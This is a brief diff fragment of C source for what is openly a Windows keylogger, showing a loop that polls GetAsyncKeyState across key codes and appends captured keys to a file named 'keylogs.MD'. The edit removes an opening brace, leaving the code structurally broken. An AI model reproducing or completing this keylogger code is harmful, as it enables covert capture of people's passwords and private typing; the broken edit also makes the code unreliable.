@@ -21,7 +21,7 @@ int main()
         for (c = 8; c <= 222; c++)
         {
             if (GetAsyncKeyState(c) == -32767)
-            {
+            
                 file = fopen("keylogs.MD", "a+");
                 if (file == NULL)
                 {
